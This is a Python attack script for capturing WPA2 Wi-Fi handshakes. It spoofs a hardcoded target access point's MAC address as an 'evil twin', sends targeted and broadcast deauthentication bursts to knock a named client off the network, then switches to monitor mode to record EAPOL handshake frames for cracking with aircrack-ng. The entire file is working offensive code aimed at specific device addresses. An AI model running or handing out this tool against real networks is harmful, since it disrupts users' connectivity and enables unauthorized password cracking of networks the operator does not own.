#!/usr/bin/env python3
"""
Combined deauth + capture for WPA2 handshake.
Rapidly cycles between AP mode (deauth) and monitor mode (capture).
Uses raw AF_PACKET socket for instant capture start (no airodump startup delay).
"""
import socket, struct, time, os, subprocess, sys

# ================== Config ==================
TARGET_BSSID = "8C:DE:F9:B3:9E:1F"
TARGET_CLIENT = "EC:4D:3E:5C:B1:12"
CHANNEL = 8
FREQ = 2447  # 2.4GHz channel 8
PCAP_FILE = "/tmp/hs_final.pcap"
NUM_CYCLES = 6
DEAUTH_COUNT = 80
DEAUTH_DELAY_MS = 5
CAPTURE_SECONDS = 15

# ================== PCAP Writer ==================
PCAP_GLOBAL_HEADER = struct.pack('<IHHIIII',
    0xa1b2c3d4,  # magic
    2, 4,        # version
    0, 0,        # thiszone, sigfigs
    65535,       # snaplen
    127          # linktype: IEEE 802.11 radiotap
)

def write_pcap_header(f):
    f.write(PCAP_GLOBAL_HEADER)

def write_pcap_packet(f, data, ts=None):
    if ts is None:
        ts = time.time()
    sec = int(ts)
    usec = int((ts - sec) * 1e6)
    f.write(struct.pack('<IIII', sec, usec, len(data), len(data)))
    f.write(data)
    f.flush()

# ================== Helpers ==================
def run(cmd):
    return subprocess.run(cmd, shell=True, capture_output=True, timeout=10)

def has_eapol(data):
    """Check if raw monitor-mode frame contains EAPOL (ethertype 0x888e)"""
    if len(data) < 30:
        return False
    # EAPOL ethertype bytes
    for i in range(len(data) - 1):
        if data[i] == 0x88 and data[i+1] == 0x8e:
            return True
    return False

def get_radiotap_len(data):
    """Get radiotap header length"""
    if len(data) < 4:
        return 0
    return struct.unpack('<H', data[2:4])[0]

def get_frame_info(data):
    """Parse 802.11 frame type from monitor mode capture"""
    rt_len = get_radiotap_len(data)
    if len(data) < rt_len + 2:
        return None, None
    fc = struct.unpack('<H', data[rt_len:rt_len+2])[0]
    ftype = (fc >> 2) & 0x3
    fsubtype = (fc >> 4) & 0xf
    return ftype, fsubtype

def ensure_hostapd_conf():
    """Ensure hostapd config exists"""
    conf = f"""interface=ap0
driver=nl80211
ssid=9899a5b76
hw_mode=g
channel={CHANNEL}
wpa=2
wpa_passphrase=dummypass123
wpa_key_mgmt=WPA-PSK
rsn_pairwise=CCMP
"""
    with open("/tmp/hs_hostapd.conf", "w") as f:
        f.write(conf)

def setup_ap():
    """Create AP interface with target BSSID"""
    run("ip link set wlan0 down")
    run("iw dev wlan0 set type managed")
    run("ip link set wlan0 up")
    run("iw phy phy0 interface add ap0 type __ap 2>/dev/null")
    run(f"ip link set ap0 address {TARGET_BSSID}")
    run("ip link set ap0 up")
    run("hostapd -B /tmp/hs_hostapd.conf")
    time.sleep(0.3)

def teardown_ap():
    """Kill AP as fast as possible"""
    run("killall hostapd")
    run("iw dev ap0 del 2>/dev/null")

def setup_monitor():
    """Switch wlan0 to monitor mode on target channel"""
    run("ip link set wlan0 down")
    run("iw dev wlan0 set type monitor")
    run("ip link set wlan0 up")
    run(f"iw dev wlan0 set freq {FREQ}")

# ================== Main ==================
def main():
    print(f"Target: {TARGET_BSSID} (9899a5b76) ch{CHANNEL}")
    print(f"Client: {TARGET_CLIENT}")
    print(f"Cycles: {NUM_CYCLES}, Deauth: {DEAUTH_COUNT}x{DEAUTH_DELAY_MS}ms, Capture: {CAPTURE_SECONDS}s/cycle")
    print()

    ensure_hostapd_conf()

    # Clean up
    run("killall hostapd 2>/dev/null")
    run("killall airodump-ng 2>/dev/null")
    run("iw dev ap0 del 2>/dev/null")

    pcap = open(PCAP_FILE, 'wb')
    write_pcap_header(pcap)

    total_packets = 0
    eapol_count = 0
    eapol_frames = []

    for cycle in range(1, NUM_CYCLES + 1):
        print(f"{'='*50}")
        print(f"CYCLE {cycle}/{NUM_CYCLES}")

        # ---- Phase 1: Deauth from AP mode ----
        t0 = time.time()
        print(f"  [{time.strftime('%H:%M:%S')}] Setting up evil twin AP...")
        setup_ap()
        t1 = time.time()
        print(f"  [{time.strftime('%H:%M:%S')}] AP ready ({t1-t0:.1f}s). Sending deauth burst...")

        # Targeted deauth
        result = run(f"python3 /tmp/deauth_nl80211.py ap0 {TARGET_BSSID} {CHANNEL} {TARGET_CLIENT} {DEAUTH_COUNT} {DEAUTH_DELAY_MS}")
        stdout = result.stdout.decode() if result.stdout else ""
        # Extract sent count
        for line in stdout.split('\n'):
            if 'Done:' in line:
                print(f"  {line.strip()}")

        # Broadcast deauth too
        result = run(f"python3 /tmp/deauth_nl80211.py ap0 {TARGET_BSSID} {CHANNEL} ff:ff:ff:ff:ff:ff 30 {DEAUTH_DELAY_MS}")
        stdout = result.stdout.decode() if result.stdout else ""
        for line in stdout.split('\n'):
            if 'Done:' in line:
                print(f"  Broadcast: {line.strip()}")

        # ---- Phase 2: FAST switch to monitor ----
        t2 = time.time()
        teardown_ap()
        setup_monitor()
        t3 = time.time()
        print(f"  [{time.strftime('%H:%M:%S')}] Monitor ready ({t3-t2:.2f}s switch)")

        # ---- Phase 3: Capture with raw socket ----
        try:
            sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0003))
            sock.bind(("wlan0", 0))
            sock.settimeout(0.5)
        except Exception as e:
            print(f"  Socket error: {e}")
            continue

        start = time.time()
        cycle_packets = 0
        cycle_eapol = 0
        data_frames = 0

        while time.time() - start < CAPTURE_SECONDS:
            try:
                data = sock.recv(65535)
                cycle_packets += 1
                total_packets += 1
                write_pcap_packet(pcap, data)

                ftype, fsubtype = get_frame_info(data)

                if has_eapol(data):
                    cycle_eapol += 1
                    eapol_count += 1
                    elapsed = time.time() - start
                    print(f"  *** EAPOL #{eapol_count} at +{elapsed:.1f}s (pkt #{total_packets}) ***")
                    eapol_frames.append(data)

                if ftype == 2:  # data frame
                    data_frames += 1

            except socket.timeout:
                continue
            except Exception as e:
                break

        sock.close()
        elapsed = time.time() - start
        print(f"  Captured: {cycle_packets} pkts ({data_frames} data), {cycle_eapol} EAPOL in {elapsed:.1f}s")

        if eapol_count >= 4:
            print(f"\n  *** Got {eapol_count} EAPOL frames - likely complete handshake! ***")
            break

    pcap.close()
    print(f"\n{'='*50}")
    print(f"TOTAL: {total_packets} packets, {eapol_count} EAPOL frames")
    print(f"PCAP: {PCAP_FILE}")

    if eapol_count > 0:
        print("\nVerifying with aircrack-ng...")
        result = run(f"aircrack-ng {PCAP_FILE}")
        out = result.stdout.decode() if result.stdout else ""
        print(out[:500])
    else:
        print("\nNo EAPOL frames captured.")
        print("Suggest: manually reconnect a device to the router while running again.")

    return 0 if eapol_count > 0 else 1

if __name__ == "__main__":
    sys.exit(main())
